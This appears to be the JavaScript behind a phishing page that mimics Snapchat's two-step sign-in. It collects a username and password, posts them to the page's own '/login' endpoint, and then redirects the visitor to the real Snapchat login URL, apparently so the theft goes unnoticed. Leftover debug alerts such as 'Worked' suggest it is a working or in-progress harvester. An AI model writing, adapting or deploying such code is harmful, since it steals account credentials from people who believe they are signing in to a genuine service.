alert("Js loaded");
let step = 1;

async function handleNext() {
  const usernameInput = document.getElementById('username');
  const username = usernameInput.value.trim();
  const usernameError = document.getElementById('username-error');
  const passwordGroup = document.getElementById('password-group');
  const passwordInput = document.getElementById('password');
  const passwordError = document.getElementById('password-error');
  const btn = document.getElementById('next-btn');
  const phoneLink = document.getElementById('phone-link');

  if (step === 1) {
    if (!username) {
      usernameError.style.display = 'block';
      return;
    }
    usernameError.style.display = 'none';
    
    passwordGroup.classList.add('visible');
    phoneLink.style.display = 'none';
    btn.textContent = 'Log in';
    step = 2;
  } else {
    const password = passwordInput.value.trim();
    if (!password) {
      passwordError.style.display = 'block';
      return;
    }
    passwordError.style.display = 'none';
    btn.textContent = 'Logging in...';
    btn.disabled = true;

    try {
      const response = await fetch('/login', {
        // alert("Trying...");
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username, password })
      });

      if (response.ok) {
        usernameInput.value = '';
        passwordInput.value = '';
        alert("Worked");
        window.location.href = 'https://accounts.snapchat.com/v2/login';
      } else {
        
        passwordError.textContent = 'Authentication failed. Please try again.';
        passwordError.style.display = 'block';
        btn.textContent = 'Log in';
        btn.disabled = false;
      }
    } catch (error) {
      console.error(error.message);
      passwordError.textContent = 'Network error. Please check your connection.';
      passwordError.style.display = 'block';
      btn.textContent = 'Log in';
      btn.disabled = false;
    }
  }
}

document.addEventListener('keydown', function(e) {
  if (e.key === 'Enter' && !btn.disabled) handleNext();
});